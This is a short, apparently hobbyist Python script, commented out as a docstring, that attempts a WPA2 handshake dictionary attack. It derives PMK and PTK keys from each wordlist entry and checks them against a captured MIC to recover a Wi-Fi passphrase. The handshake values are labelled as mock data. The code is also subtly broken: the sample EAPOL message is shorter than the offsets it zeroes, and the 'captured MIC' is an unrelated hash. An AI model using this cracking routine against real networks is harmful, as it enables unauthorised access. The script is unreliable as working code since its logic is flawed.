#!venv/bin/python




# MANUAL WPA CAPTURE ATTEMPT #
"""
import binascii
import hashlib
import hmac
from pathlib import Path

# Function to generate the Pairwise Transient Key (PTK)
def generate_ptk(passphrase, ssid, a_nonce, s_nonce, ap_mac, client_mac):
    # Derive the Pairwise Master Key (PMK) using PBKDF2-HMAC-SHA1
    pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
    
    # Construct the PTK
    ptk = b''
    data = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(a_nonce, s_nonce) + max(a_nonce, s_nonce)
    for i in range(4):
        ptk += hmac.new(pmk, b"Pairwise key expansion" + data + bytes([i]), hashlib.sha1).digest()
    
    # Trim PTK to 48 bytes
    return ptk[:48]


# Function to verify if the PTK generates the correct MIC
def verify_mic(ptk, eapol_msg, captured_mic):
    # The EAPOL message should be modified to set the MIC field to zero
    modified_eapol_msg = bytearray(eapol_msg)
    modified_eapol_msg[81:97] = b'\x00' * 16  # Assuming MIC field is at these indices

    # Calculate the MIC using HMAC-SHA1 (only first 16 bytes used for WPA2)
    mic = hmac.new(ptk[0:16], modified_eapol_msg, hashlib.sha1).digest()[:16]
    return mic.hex() == captured_mic.lower()


script_dir = Path(__file__).parent
wordlist_file = f"{script_dir}/wordlist.txt"

ssid = "MyTestNetwork"
a_nonce = binascii.unhexlify("abc123def4567890abcd1234ef567890")
s_nonce = binascii.unhexlify("7890abcd1234ef567890abcd1234ef56")
ap_mac = binascii.unhexlify("001122334455")  # Removed colons from MAC address
client_mac = binascii.unhexlify("66778899aabb")  # Removed colons from MAC address
eapol_msg = binascii.unhexlify("0103000000dd2eac4951c9c2a2b90507e59d548aa2389b0e5a29da63b64c53dbaedb4e2b61")
captured_mic = "5f4dcc3b5aa765d61d8327deb882cf99"  # This is a mock MIC for testing

# Print for verification
print("AP Nonce:", a_nonce)
print("Client Nonce:", s_nonce)
print("AP MAC:", ap_mac)
print("Client MAC:", client_mac)
print()
print()

# Brute-force through the wordlist to find the passphrase
with open(wordlist_file, 'r') as wordlist:
    for passphrase in wordlist:
        passphrase = passphrase.strip()
        ptk = generate_ptk(passphrase, ssid, a_nonce, s_nonce, ap_mac, client_mac)
        
        print(f"{passphrase} - {ptk}")

        if verify_mic(ptk, eapol_msg, captured_mic):
            print(f"Password found: {passphrase}")
            break
        else:
            print("Password not found.")
"""